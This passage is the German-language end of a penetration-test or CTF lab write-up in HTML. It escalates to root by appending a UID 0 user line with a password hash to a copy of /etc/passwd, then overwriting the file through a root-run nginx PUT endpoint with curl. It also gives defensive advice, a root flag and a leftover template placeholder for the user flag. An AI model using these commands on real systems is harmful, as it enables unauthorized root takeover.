+            <p class="evaluation"><strong>Bewertung:</strong> Die Nginx-Instanz mit Root-Rechten und der bösartigen Konfiguration (die PUT-Methoden auf Port 4448 aktiviert) wurde erfolgreich gestartet. Ich habe das Passwort von <code>riva</code> erfolgreich verwendet, um die <code>sudo</code>-Passwortabfrage zu bestehen. Ich bin nun bereit, die Dateisystem-Schreibfähigkeit als Root auszunutzen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun ein neues <code>/etc/passwd</code> erstellen, das einen neuen Benutzer mit Root-Rechten enthält, und dieses dann über die Nginx PUT-Methode auf Port 4448 auf das Zielsystem übertragen, um das originale <code>/etc/passwd</code> zu überschreiben.<br><strong>Empfehlung (Admin):</strong> Sichern Sie Benutzerpasswörter und speichern Sie diese nicht unverschlüsselt (z.B. in Browser-Profilen). Die Kompromittierung eines Benutzerpassworts kann weitreichende Folgen haben, insbesondere wenn dieser Benutzer <code>sudo</code>-Rechte besitzt. Stellen Sie sicher, dass <code>sudo</code>-Regeln, die Passworteingabe erfordern, nicht leicht durch das Knacken von Benutzerpasswörtern umgangen werden können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">riva@leet:/tmp$</span> <span class="command">cat /etc/passwd > /tmp/neue_passwd</span>
+<span class="command">riva@leet:/tmp$</span> <span class="command">echo 'dark:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash' >> /tmp/neue_passwd</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die <code>/etc/passwd</code>-Datei zu manipulieren und einen neuen Root-Benutzer hinzuzufügen, erstelle ich zuerst eine Kopie der aktuellen <code>/etc/passwd</code>-Datei im temporären Verzeichnis <code>/tmp/</code> mit dem Befehl <code>cat /etc/passwd > /tmp/neue_passwd</code>. Dies lese ich die originale Datei aus und schreibe ihren Inhalt in die neue Datei <code>/tmp/neue_passwd</code>. Danach füge ich eine neue Zeile am Ende dieser temporären Datei hinzu, die den Eintrag für einen neuen Benutzer namens <code>dark</code> enthält, mit dem Befehl <code>echo 'dark:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash' >> /tmp/neue_passwd</code>. Diese neue Zeile definiert den Benutzer <code>dark</code>, gibt ihm die UID <code>0</code> und GID <code>0</code> (was Root-Rechten entspricht), setzt sein Home-Verzeichnis auf <code>/root</code> und seine Shell auf <code>/bin/bash</code>. Der Hash <code>$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0</code> ist ein gehashtes Passwort, das ich zuvor offline generiert habe und kenne. Für Laien: Ich mache eine Kopie der Datei mit der Benutzerliste (<code>/etc/passwd</code>) und füge dann 'meinen' neuen 'Geheimbenutzer' namens 'dark' hinzu. Dieser Benutzer 'dark' soll alle Rechte des Super-Administrators haben und kann sich mit einem von mir festgelegten Passwort anmelden. Für Experten: Das Hinzufügen eines neuen Eintrags mit UID 0 und GID 0 zu <code>/etc/passwd</code> ist eine klassische Methode zur Erlangung von Root-Rechten. Wichtig ist hierbei, dass der Passwort-Hash korrekt generiert wird (z.B. mit <code>mkpasswd</code> oder Python) und dass die resultierende Datei dann die originale <code>/etc/passwd</code> ersetzen kann. Die Verwendung von <code>></code> überschreibt die Zieldatei, <code>>></code> hängt an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ich habe erfolgreich eine modifizierte <code>/tmp/neue_passwd</code>-Datei erstellt, die einen neuen Benutzer <code>dark</code> mit Root-Berechtigungen und einem von mir kontrollierten Passwort enthält. Diese Datei ist nun bereit, die originale <code>/etc/passwd</code> auf dem Zielsystem zu überschreiben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die PUT-Methode des bösartigen Nginx-Servers auf Port 4448 nutzen, um die Datei <code>/tmp/neue_passwd</code> auf das Zielsystem als <code>/etc/passwd</code> hochzuladen und so die originale Datei zu ersetzen. Danach kann ich mich als Benutzer <code>dark</code> anmelden und sollte Root-Rechte haben.<br><strong>Empfehlung (Admin):</strong> Die <code>/etc/passwd</code>-Datei ist eine der kritischsten Dateien auf einem Linux-System. Ihre Integrität muss jederzeit gewährleistet sein. Implementieren Sie strikte Dateiberechtigungen (oft <code>-rw-r--r-- root root</code>, wobei die Schatten-Datei die Hashes enthält und <code>/etc/passwd</code> das zweite Feld 'x' hat). Verwenden Sie File Integrity Monitoring (FIM) für <code>/etc/passwd</code> und <code>/etc/shadow</code>, um unbefugte Änderungen sofort zu erkennen. Verhindern Sie das Ausführen von Diensten mit Root-Rechten, die Schreibzugriff auf das Dateisystem über unsichere Methoden wie WebDAV PUT ermöglichen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">riva@leet:/tmp$</span> <span class="command">curl -X PUT --data-binary @/tmp/neue_passwd http://127.0.0.1:4448/etc/passwd</span>
+<span class="command">riva@leet:/tmp$</span> <span class="command">su dark</span>
+<span class="password">Password:</span>
+<span class="password">root@leet:/tmp#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze nun die Schreibfähigkeit des bösartigen Nginx-Servers auf Port 4448. Der Befehl <code>curl -X PUT --data-binary @/tmp/neue_passwd http://127.0.0.1:4448/etc/passwd</code> sendet eine HTTP PUT-Anfrage. Der Parameter <code>-X PUT</code> spezifiziert die HTTP-Methode. <code>--data-binary @/tmp/neue_passwd</code> weist <code>curl</code> an, den Inhalt der lokalen Datei <code>/tmp/neue_passwd</code> als binäre Daten im Body der PUT-Anfrage zu senden. Die Ziel-URL <code>http://127.0.0.1:4448/etc/passwd</code> dirigiert Nginx, diese Daten unter dem Pfad <code>/etc/passwd</code> im System-Root-Verzeichnis (da das Webroot auf <code>/</code> gesetzt ist) zu speichern, was die originale Datei überschreibt. Nach erfolgreichem Überschreiben der <code>/etc/passwd</code>-Datei versuche ich, mich als der neu erstellte Benutzer <code>dark</code> mit dem Befehl <code>su dark</code> anzumelden. Ich werde nach dem Passwort gefragt, gebe das zuvor generierte Passwort für den Benutzer <code>dark</code> ein. Die Ausgabe <code>root@leet:/tmp#</code> und die darauffolgende Ausgabe von <code>id</code> (<code>uid=0(root) gid=0(root) groups=0(root)</code>) zeigen, dass die Anmeldung als Benutzer <code>dark</code> erfolgreich war und ich nun Root-Berechtigungen besitze. Für Laien: Ich habe die Datei mit dem neuen 'Geheimbenutzer' 'dark' über die spezielle 'Telefonleitung' (Port 4448) auf den Computer 'hochgeladen' und dabei die alte Benutzerliste ersetzt. Dann habe ich versucht, mich als 'dark' anzumelden, mein Passwort eingegeben, und fantastisch, ich bin jetzt der Super-Administrator ('root')! Für Experten: Die erfolgreiche Nutzung der WebDAV PUT-Methode über Nginx, der mit Root-Rechten läuft und das System-Root als Webroot hat, ist eine effektive Methode zur Erlangung von Root-Rechten durch Überschreiben kritischer Systemdateien wie <code>/etc/passwd</code>. Der anschließende erfolgreiche <code>su dark</code> Befehl und die <code>id</code>-Ausgabe bestätigen die erfolgreiche Privilegien-Eskalation auf Root-Ebene. Die Bash-Shell ändert ihren Prompt zu <code>#</code>, wenn man Root ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich! Ich habe die <code>/etc/passwd</code>-Datei erfolgreich überschrieben und konnte mich als der neu erstellte Benutzer <code>dark</code> mit Root-Berechtigungen anmelden. Dies ist der vollständige Kompromiss des Systems.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe mein Ziel erreicht. Nun kann ich auf alle Dateien zugreifen, einschließlich der Root-Flag. Ich werde die Root-Flag auslesen und den Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Dies ist die schwerwiegendste Schwachstelle – ein Angreifer hat Root-Rechte erlangt. Dies erfordert eine sofortige Reaktion: Nehmen Sie das System offline, identifizieren Sie die Root Cause der Schwachstelle (unsichere <code>sudo</code>-Regel für Nginx, unsichere Nginx-Konfiguration, kompromittiertes Benutzerpasswort), patchen Sie das System, stellen Sie es von einem sauberen Backup wieder her und implementieren Sie umfassende Sicherheitsmaßnahmen, um solche Angriffe in Zukunft zu verhindern.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- Einzelne Flags werden hier im korrigierten Format eingefügt -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/riva/user.txt</div>
+                    <div class="flag-value"><span class="password">[User Flag Wert aus Text extrahieren]</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat r007_fl46.7x7</div>
+                    <div class="flag-value"><span class="password">ca169772acb099a02ebab8da1d9070ea</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 15. Juni 2025</p>
+    </footer>
+ 
+
+</body>
+</html>
